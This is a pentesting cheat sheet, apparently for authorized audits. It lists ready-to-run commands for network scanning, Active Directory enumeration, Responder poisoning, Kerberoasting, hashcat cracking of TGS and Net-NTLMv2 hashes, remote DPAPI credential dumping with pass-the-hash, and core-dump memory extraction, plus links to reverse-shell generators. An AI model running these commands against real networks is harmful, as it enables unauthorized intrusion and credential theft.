

Some pentesting stuff about Windows/AD & Linux.

Useful links
------------
- Wordlists #1 : <https://github.com/danielmiessler/SecLists>
- Wordlists #2 : <https://github.com/clem9669/wordlists> 
- PrivEsc Linux & Windows : <https://github.com/carlospolop/PEASS-ng>
- PrivEsc Linux : <https://gtfobins.github.io/>
- PrivEsc Windows : <https://lolbas-project.github.io/#>
- Reverse Shells : <https://www.revshells.com>
- Windows / AD : <https://wadcoms.github.io/>
- OSINT : <https://www.couverture-mobile.fr/>
- Windows (Creds) : <https://github.com/login-securite/DonPAPI>

## Network Enumeration

Some stuff about network enums.

```markdown
nmap
----

# Host Discovery 
nmap -sn -v <IP>/CIDR
 
# TCP Scan
nmap -sS -sC -sV -oA <FILENAME>.tcp <IP> -v
 
# 1000 most common TCP ports on an IP range
nmap -sV --open <IP>/CIDR
 
# UDP Scan
nmap -sU -sS -sC -sV -oA <FILENAME>.udp <IP> -v
 
# 1000 most common UDP ports on an IP range
nmap -sU -sV --open <IP>/CIDR

 TIPS  
  - -p- : scan all ports
  - -Pn : to scan ports on Windows hosts
  
  
masscan
-------

# Fast scan of a big subnet with selected open ports 
masscan <IP>/CIDR --rate=10000 --ports <portsToScan> (ex. 80,443,445)


```

## Windows / Active Directory 

Some stuff about Windows & AD pentesting.

```markdown
Network Analysis

# Responder 
responder -I <interface> -vrd

```
```markdown
Enumeration 

# No creds
- enum4linux -a -u "" -p "" <DC IP> 
- enum4linux -a -u "guest" -p "" <DC IP>
 
- smbclient -U '%' -L //<DC IP> 
- smbclient -U 'guest%' -L //
 
- nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>

# With Creds
- impacket-GetADUsers.py -all -dc-ip <DC IP> <domain>/username
- enum4linux -a -u <USER> -p <PASSWORD> <DC IP> 
 
# CrackMapExec
- crackmapexec smb <DC IP> -u <USER> -p <PASSWORD> --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol > cme_enum.txt
 
```
```markdown
SMB 
# Explore Shares
impacket-smbclient '<USER>:<PASSWORd>'@<DC IP>
# Check SMB Signature on server
Responder-runfinger -i <IP>/CIDR
```
```markdown
KERBEROS 

# Dump SPN users TGS
- GetUsersSPNs.py -request -dc-ip <IP-DC> <domain.local>/<USER> -outputfile impacket_TGS_<IP>.txt

# Crack TGS
- hashcat -m 13100 hash.txt /home/audit/Documents/french -r d3adhob0.rule -O -w 3
 
```
```markdown
 CREDZ

# Dump credz remotely with DPAPI Key (account should be a local admin account)
- python3 DonPAPI.py --hashes <LM>:<NT> domain/user@target OR DonPAPI.py domain/user:passw0rd@target

# Net-NTLMv2 hash cracking
-  hashcat -m 5600 hash.txt /home/audit/Documents/french -r d3adhob0.rule -O -w 3
 
```


## REVERSE
Some stuff about Reverse

```markdown
# Dump memory content with core dump

- run binary
- CTRL+Z, so binary is paused
- ps to find pid
- kill -SIGSEGV <pid>
- fg then the binary crash
- look at /var/crash for the binary crash log

apport-unpack <crashReport> <destFolder>
then strings destFolder/CoreDump
```
